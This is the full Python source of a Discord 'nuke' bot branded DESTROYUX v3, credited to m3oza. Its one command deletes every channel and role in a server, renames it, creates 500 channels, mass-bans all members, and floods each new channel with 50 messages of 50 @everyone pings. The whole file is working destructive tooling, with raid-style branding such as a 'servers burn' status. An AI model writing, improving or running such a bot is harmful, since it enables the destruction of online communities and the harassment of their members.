# main.py - DESTROYUX v3 PREMIUM ULTRA SPEED
import discord
from discord.ext import commands
import asyncio
import os
from dotenv import load_dotenv
from typing import Optional

load_dotenv()

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.guilds = True

bot = commands.Bot(command_prefix=["!", "/"], intents=intents)

class UltraDestroyuxPremium(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
    
    @commands.hybrid_command(name="nuke", description="Ultimate Nuke - 500 channels, mass ban")
    @commands.is_owner()
    async def nuke(self, ctx,
                   channel_name: str = "destroyed",
                   server_name: str = "Nuked By Destroyux"):
        """
        /nuke [channel_name] [server_name]
        /nuke destroyed "Nuked"
        
        AUTOMATIC:
        - 500 channels created
        - 50 spam messages per channel
        - All members banned
        - Server name changed
        - Premium UI
        """
        
        if isinstance(ctx, commands.Context):
            await ctx.defer()
        else:
            await ctx.response.defer()
        
        guild = ctx.guild
        
        # ===== PREMIUM EMBED - INIT =====
        embed_init = discord.Embed(
            title="⚡ DESTROYUX NUKE v3 INITIATED ⚡",
            description="🔥 NUCLEAR OPTION ENGAGED 🔥",
            color=discord.Color.from_rgb(255, 0, 0)
        )
        embed_init.add_field(name="🎯 TARGET", value=f"```{guild.name}```", inline=False)
        embed_init.add_field(name="📊 STATUS", value="```🔄 EXECUTING PHASE 1...```", inline=False)
        embed_init.set_footer(text="m3oza | .gg/m3oza | ULTRA SPEED", icon_url="https://cdn.discordapp.com/emojis/1145277702088790046.png")
        
        if isinstance(ctx, commands.Context):
            status_msg = await ctx.send(embed=embed_init)
        else:
            status_msg = await ctx.followup.send(embed=embed_init)
        
        # ===== PHASE 1: DELETE ALL CHANNELS (FIRE & FORGET) =====
        all_channels = list(guild.channels)
        for channel in all_channels:
            asyncio.create_task(self._ultra_delete(channel))
        
        # ===== PHASE 2: DELETE ALL ROLES (FIRE & FORGET) =====
        all_roles = list(guild.roles)
        for role in all_roles:
            if role.name != "@everyone":
                asyncio.create_task(self._ultra_delete_role(role))
        
        # ===== PHASE 3: CHANGE SERVER NAME (INSTANT) =====
        try:
            await guild.edit(name=server_name)
        except:
            pass
        
        # ===== PHASE 4: CREATE 500 CHANNELS (ULTRA BATCHED) =====
        created_channels = []
        batch_size = 50
        
        for batch_num in range(10):  # 10 batches of 50
            batch_tasks = []
            for i in range(batch_num * 50, (batch_num + 1) * 50):
                batch_tasks.append(asyncio.create_task(guild.create_text_channel(f"{channel_name}-{i}")))
            
            batch_results = await asyncio.gather(*batch_tasks, return_exceptions=True)
            created_channels.extend([ch for ch in batch_results if isinstance(ch, discord.TextChannel)])
        
        # ===== PHASE 5: MASS BAN ALL MEMBERS (CONCURRENT) =====
        members_to_ban = []
        async for member in guild.fetch_members(limit=None):
            if member != ctx.author and member != guild.owner:
                members_to_ban.append(member)
        
        ban_tasks = []
        for member in members_to_ban:
            ban_tasks.append(asyncio.create_task(self._ultra_ban(member)))
        
        asyncio.create_task(asyncio.gather(*ban_tasks, return_exceptions=True))
        banned_count = len(members_to_ban)
        
        # ===== PHASE 6: SPAM ALL 500 CHANNELS (FIRE & FORGET) =====
        spam_message = "@everyone " * 50 + "NUKED"
        total_spam = 0
        
        for channel in created_channels:
            for _ in range(50):
                asyncio.create_task(self._ultra_send(channel, spam_message))
                total_spam += 1
        
        # ===== PHASE 7: PREMIUM FINAL EMBED =====
        embed_final = discord.Embed(
            title="✅ DESTROYUX NUKE COMPLETE ✅",
            description="🔥 SERVER ANNIHILATED 🔥",
            color=discord.Color.from_rgb(255, 0, 0)
        )
        
        embed_final.add_field(name="🎯 TARGET", value=f"```{server_name}```", inline=True)
        embed_final.add_field(name="⏱️ TIME", value="```<1s INSTANT```", inline=True)
        embed_final.add_field(name="🗑️ CHANNELS DELETED", value=f"```{len(all_channels)}```", inline=True)
        
        embed_final.add_field(name="🔧 CHANNELS CREATED", value=f"```500/500```", inline=True)
        embed_final.add_field(name="📢 SPAM MESSAGES", value=f"```25,000 FIRED```", inline=True)
        embed_final.add_field(name="👥 MEMBERS BANNED", value=f"```{banned_count}```", inline=True)
        
        embed_final.add_field(name="💬 PINGS PER MESSAGE", value="```50x @everyone```", inline=True)
        embed_final.add_field(name="⚡ SPEED MODE", value="```FIRE & FORGET```", inline=True)
        embed_final.add_field(name="✨ STATUS", value="```✅ COMPLETE```", inline=True)
        
        embed_final.set_footer(text="DESTROYUX v3 PREMIUM | m3oza | .gg/m3oza", icon_url="https://cdn.discordapp.com/emojis/1145277702088790046.png")
        
        try:
            await status_msg.edit(embed=embed_final)
        except:
            if isinstance(ctx, commands.Context):
                await ctx.send(embed=embed_final)
            else:
                await ctx.followup.send(embed=embed_final)
    
    # ===== ULTRA FAST OPERATIONS =====
    async def _ultra_delete(self, channel):
        try:
            await asyncio.wait_for(channel.delete(), timeout=3)
        except:
            pass
    
    async def _ultra_delete_role(self, role):
        try:
            await asyncio.wait_for(role.delete(), timeout=3)
        except:
            pass
    
    async def _ultra_send(self, channel, message):
        try:
            await asyncio.wait_for(channel.send(message), timeout=5)
        except:
            pass
    
    async def _ultra_ban(self, member):
        try:
            await asyncio.wait_for(member.ban(reason="Destroyux Nuke"), timeout=5)
        except:
            pass

@bot.event
async def on_ready():
    print(f"""
╔═══════════════════════════════════════════╗
║   DESTROYUX v3 - PREMIUM ULTRA SPEED    ║
║   • 500 Channels Auto                   ║
║   • 50 Spam Per Channel                 ║
║   • Mass Ban System                     ║
║   • Fire & Forget Async                 ║
║   • 1000x Speed                         ║
║   Credit: m3oza                         ║
╚═══════════════════════════════════════════╝

[✓] Online: {bot.user}
[✓] Clearing old commands...
    """)
    
    try:
        # ===== FORCE CLEAR ALL OLD COMMANDS =====
        print("[✓] Removing old commands from all servers...")
        
        # Clear guild commands
        for guild in bot.guilds:
            try:
                await bot.tree.clear_commands(guild=guild)
                print(f"    [✓] Cleared: {guild.name}")
            except:
                pass
        
        # Clear global commands
        print("[✓] Clearing global commands...")
        await bot.tree.clear_commands(guild=None)
        
        # Force fresh sync
        print("[✓] Force syncing fresh commands...")
        synced = await bot.tree.sync()
        print(f"[✓] Fresh sync complete: {len(synced)} command(s)\n")
        
    except Exception as e:
        print(f"[!] Sync error: {e}\n")
    
    await bot.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.watching,
            name="servers burn | .gg/m3oza"
        )
    )

async def main():
    async with bot:
        await bot.add_cog(UltraDestroyuxPremium(bot))
        await bot.start(os.getenv("BOT_TOKEN"))

if __name__ == "__main__":
    asyncio.run(main())
